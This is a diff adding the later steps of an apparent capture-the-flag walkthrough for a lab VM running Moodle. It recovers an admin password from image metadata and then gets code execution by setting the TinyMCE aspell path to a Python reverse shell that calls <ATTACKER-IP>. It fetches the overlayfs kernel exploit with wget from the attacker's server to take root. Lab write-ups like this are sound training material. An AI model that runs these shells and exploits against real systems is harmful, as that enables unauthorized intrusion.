@@ -88,3 +88,96 @@ Discovered POP3 Credentials (doak):
             Folder: for james
             
             File: s3cret.txt
+
+## Steganography & Administrative RCE
+
+### 8. Extracting Admin Credentials via Steganography
+
+    Reading s3cret.txt:
+
+    The file inside Dr. Doak's private files contains a note referencing an image at /dir007key/for-007.jpg.
+
+    Inspecting Metadata:
+
+Download and run exiftool on for-007.jpg to discover a Base64-encoded string hidden in the Image Description field:
+
+eFdpbnRlclJjcjE5OTVXIQ==
+
+Decoding the Base64 String:
+```echo eFdpbnRlclJjcjE5OTVXIQ== | base64 -d```
+Decoded Admin Password: xWinter1995x!
+
+### 9. Moodle Administration & RCE Execution
+
+   1. Admin Login:
+
+    Log into the Moodle instance (/gnocertdir/login/index.php) using:
+    Username: admin
+    Password: xWinter1995x!
+
+   2. Configuring the Spellchecker Exploit (TinyMCE RCE):
+          Navigate to Site Administration $\rightarrow$ Editor settings / TinyMCE HTML editor $\rightarrow$ Spellcheck settings.
+          Set the Spell engine to PSpellShell.
+          In the Path to aspell field, input a reverse shell command targeting your local listener IP and port:
+
+```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER-IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
+Click Save changes.
+
+   3. Triggering the Reverse Shell:
+
+    Start a Netcat listener on your Kali machine:
+    nc -lvnp 443
+
+    Create a new blog post via My profile $\rightarrow$ Blogs $\rightarrow$ Add a new entry.
+    Type text into the body editor and trigger the spellcheck functionality, executing the payload defined in the aspell path.
+   
+   4. Shell Caught:The shell connects back, granting execution as www-data:
+
+      ```
+      uid=33(www-data) gid=33(www-data) groups=33(www-data)    
+      pwd: /var/www/html/gnocertdir/lib/editor/tinymce/tiny_mce/3.4.9/plugins/spellchecker```
+
+
+## Root Privilege Escalation
+### 10. Target System Reconnaissance
+
+After obtaining the shell, enumerate the OS and kernel version:
+        ```uname -a```
+Output:
+        ```Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux```
+
+### 11. Exploit Execution: overlayfs (CVE-2015-1328)
+
+The target running Ubuntu with Kernel 3.13.0-32 is vulnerable to the overlayfs local privilege escalation exploit (Exploit-DB ID: 37292).
+Host Attacker Web Server:
+Serve the exploit C code (37292.c) using Python on your Kali machine:
+        ```python3 -m http.server 8081```
+
+Download Exploit to Target:
+Navigate to the world-writable /tmp directory on the victim host and fetch the file:
+        ```cd /tmp
+wget http://<ATTACKER-IP>:8081/37292.c```
+
+Compile Exploit:
+Replace standard compiler flags if needed and compile:
+        ```sed -i "s/gcc/cc/g" 37292.c
+cc 37292.c -o exploited```
+
+Execute Exploit:
+Run the binary to escalate privileges to root:
+        ```./exploited```
+
+### 12. Root Access & Flag Retrieval
+
+Verify Root Privileges:
+        ```id
+ Output: uid=0(root) gid=0(root) groups=0(root)```
+
+Read Hidden Root Flag:
+        ```cat /root/.flag.txt```
+
+Contents of .flag.txt:
+        ```Alec told me to place the codes here:
+            568628e0d993b1973adc718237da6e93
+            If you captured this make sure to go here.....
+            /006-final/xvf7-flag/```
